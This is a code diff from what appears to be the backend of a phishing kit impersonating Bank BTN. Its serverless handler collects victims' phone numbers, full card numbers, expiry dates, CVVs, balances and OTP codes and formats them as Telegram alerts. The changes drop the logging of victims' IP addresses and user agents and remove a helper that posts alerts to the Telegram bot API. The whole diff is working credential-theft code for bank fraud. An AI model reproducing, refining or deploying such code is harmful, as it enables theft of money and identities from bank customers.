@@ -39,30 +39,29 @@ exports.handler = async (event, context) => {
             timestamp
         } = data;
 
-        // Format pesan untuk Telegram dengan style box drawing
+        // Format pesan untuk Telegram dengan style box drawing (TANPA IP & USER AGENT)
         let message = '';
         
         // Cek jenis data yang dikirim (berdasarkan field yang ada)
         const isPhoneOnly = phoneNumber && !cardNumber && !otpCode;
         const isCardData = cardNumber && !otpCode;
         const isFullData = phoneNumber && cardNumber && otpCode;
-        const isOtpOnly = otpCode && !cardNumber;
         
         if (isPhoneOnly) {
             // Notifikasi hanya nomor HP (halaman 1)
-            message = formatPhoneNotification(phoneNumber, timestamp, event.headers);
+            message = formatPhoneNotification(phoneNumber, timestamp);
         } 
         else if (isCardData) {
             // Notifikasi data kartu ATM (halaman 2)
-            message = formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, timestamp, event.headers);
+            message = formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, timestamp);
         }
         else if (isFullData || otpCode) {
             // Notifikasi OTP (halaman 3)
-            message = formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp, event.headers);
+            message = formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp);
         }
         else {
             // Fallback format lama
-            message = formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp, event.headers);
+            message = formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp);
         }
 
         // Kirim ke Telegram
@@ -114,8 +113,8 @@ exports.handler = async (event, context) => {
     }
 };
 
-// Format notifikasi hanya nomor HP (Halaman 1)
-function formatPhoneNotification(phoneNumber, timestamp, headers) {
+// Format notifikasi hanya nomor HP (Halaman 1) - TANPA IP & USER AGENT
+function formatPhoneNotification(phoneNumber, timestamp) {
     const currentTime = new Date(timestamp).toLocaleString('id-ID', {
         timeZone: 'Asia/Jakarta',
         day: '2-digit',
@@ -125,22 +124,18 @@ function formatPhoneNotification(phoneNumber, timestamp, headers) {
         minute: '2-digit',
         second: '2-digit'
     });
-    
-    const clientIP = headers['x-forwarded-for'] || headers['client-ip'] || 'Unknown IP';
-    const userAgent = headers['user-agent'] || '-';
     
     let message = `<b>┌• AKUN | BANK BTN</b>\n`;
     message += `<b>├•</b> ${phoneNumber}\n`;
     message += `<b>├───────────────────</b>\n`;
     message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
-    message += `<b>├• 🌐 IP Address :</b> ${clientIP}\n`;
     message += `<b>╰───────────────────</b>`;
     
     return message;
 }
 
-// Format notifikasi data kartu ATM (Halaman 2)
-function formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, timestamp, headers) {
+// Format notifikasi data kartu ATM (Halaman 2) - TANPA IP & USER AGENT
+function formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, timestamp) {
     const currentTime = new Date(timestamp).toLocaleString('id-ID', {
         timeZone: 'Asia/Jakarta',
         day: '2-digit',
@@ -150,9 +145,6 @@ function formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estima
         minute: '2-digit',
         second: '2-digit'
     });
-    
-    const clientIP = headers['x-forwarded-for'] || headers['client-ip'] || 'Unknown IP';
-    const userAgent = headers['user-agent'] || '-';
     
     // Format saldo dengan pemisah ribuan
     const formattedBalance = formatRupiah(estimatedBalance);
@@ -167,14 +159,13 @@ function formatCardNotification(phoneNumber, cardNumber, expiryDate, cvv, estima
     message += `<b>├• 💰 Saldo :</b> Rp ${formattedBalance}\n`;
     message += `<b>├───────────────────</b>\n`;
     message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
-    message += `<b>├• 🌐 IP Address :</b> ${clientIP}\n`;
     message += `<b>╰───────────────────</b>`;
     
     return message;
 }
 
-// Format notifikasi OTP (Halaman 3) - LENGKAP dengan semua data
-function formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp, headers) {
+// Format notifikasi OTP (Halaman 3) - LENGKAP TANPA IP & USER AGENT
+function formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp) {
     const currentTime = new Date(timestamp).toLocaleString('id-ID', {
         timeZone: 'Asia/Jakarta',
         day: '2-digit',
@@ -184,9 +175,6 @@ function formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimat
         minute: '2-digit',
         second: '2-digit'
     });
-    
-    const clientIP = headers['x-forwarded-for'] || headers['client-ip'] || 'Unknown IP';
-    const userAgent = headers['user-agent'] || '-';
     
     // Format saldo dengan pemisah ribuan
     const formattedBalance = formatRupiah(estimatedBalance);
@@ -203,15 +191,13 @@ function formatOtpNotification(phoneNumber, cardNumber, expiryDate, cvv, estimat
     message += `<b>├• 🔢 Kode OTP :</b> <code>${otpCode}</code>\n`;
     message += `<b>├───────────────────</b>\n`;
     message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
-    message += `<b>├• 🌐 IP Address :</b> ${clientIP}\n`;
-    message += `<b>├• 🤖 User Agent :</b> ${userAgent.substring(0, 50)}${userAgent.length > 50 ? '...' : ''}\n`;
     message += `<b>╰───────────────────</b>`;
     
     return message;
 }
 
-// Format legacy fallback
-function formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp, headers) {
+// Format legacy fallback - TANPA IP & USER AGENT
+function formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, estimatedBalance, otpCode, timestamp) {
     const currentTime = new Date(timestamp).toLocaleString('id-ID', {
         timeZone: 'Asia/Jakarta',
         day: '2-digit',
@@ -222,7 +208,6 @@ function formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, esti
         second: '2-digit'
     });
     
-    const clientIP = headers['x-forwarded-for'] || headers['client-ip'] || 'Unknown IP';
     const formattedBalance = formatRupiah(estimatedBalance);
     
     let message = `<b>┌• AKUN | BANK BTN</b>\n`;
@@ -250,7 +235,6 @@ function formatLegacyNotification(phoneNumber, cardNumber, expiryDate, cvv, esti
     
     message += `<b>├───────────────────</b>\n`;
     message += `<b>├• 🕐 Waktu :</b> ${currentTime}\n`;
-    message += `<b>├• 🌐 IP Address :</b> ${clientIP}\n`;
     message += `<b>╰───────────────────</b>`;
     
     return message;
@@ -272,43 +256,12 @@ function formatRupiah(angka) {
     return rupiah || '0';
 }
 
-// Fungsi untuk format nomor kartu (tampilkan 4 digit terakhir saja untuk keamanan, tapi tetap full di notifikasi)
+// Fungsi untuk format nomor kartu
 function formatCardNumber(cardNumber) {
     if (!cardNumber) return '-';
-    // Hapus spasi
     const clean = cardNumber.replace(/\s/g, '');
     if (clean.length === 16) {
-        // Tampilkan full 16 digit dengan spasi setiap 4 digit
         return clean.match(/.{1,4}/g).join(' ');
     }
     return cardNumber;
-}
-
-// Notifikasi singkat untuk update cepat (opsional - bisa dihapus jika tidak perlu)
-async function sendQuickNotification(botToken, chatId, phoneNumber, stage) {
-    try {
-        let quickMessage = '';
-        if (stage === 'phone') {
-            quickMessage = `📱 *New Phone Number*\n└─ ${phoneNumber}`;
-        } else if (stage === 'card') {
-            quickMessage = `💳 *New Card Data*\n└─ Phone: ${phoneNumber}`;
-        } else {
-            quickMessage = `🔐 *New OTP Submission*\n└─ Phone: ${phoneNumber}`;
         }
-        
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: quickMessage,
-                parse_mode: 'Markdown',
-                disable_notification: false
-            })
-        });
-    } catch (error) {
-        console.error('Failed to send quick notification:', error);
-    }
-}
